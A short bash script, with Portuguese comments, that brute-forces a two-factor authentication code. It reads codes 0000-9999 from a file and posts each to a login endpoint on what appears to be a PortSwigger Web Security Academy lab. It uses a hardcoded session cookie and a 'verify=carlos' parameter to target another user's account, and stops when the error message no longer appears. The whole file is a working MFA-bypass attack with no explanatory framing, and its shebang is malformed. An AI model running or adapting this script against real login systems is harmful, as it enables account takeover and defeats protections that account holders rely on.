!#/bin/bash

mfa_list="$1"

echo "Brute-forcing 2FA..."

#Ler cada código de 0000-9999
while read -r line; do
        mfa_code="$line"

        #Request com o código de sessão e não printar mensagem de erro
        request=$(curl -d "mfa-code=$mfa_code" --cookie "session=CpxNkNiPd4aoROjoaGNS9yBVG6JhFIy0;verify=carlos" -X POST https://0a9b00b5035935ccc240073f005f0014.web-security-academy.net/login2 2>/dev/null)
        
        #Se não achar esta mensagem de erro, então o código foi achado
        if [[ $request != *"Incorrect security code"* ]]; then
                echo $mfa_code "CODE FOUND!!!"
                break
        fi
done < "$mfa_list"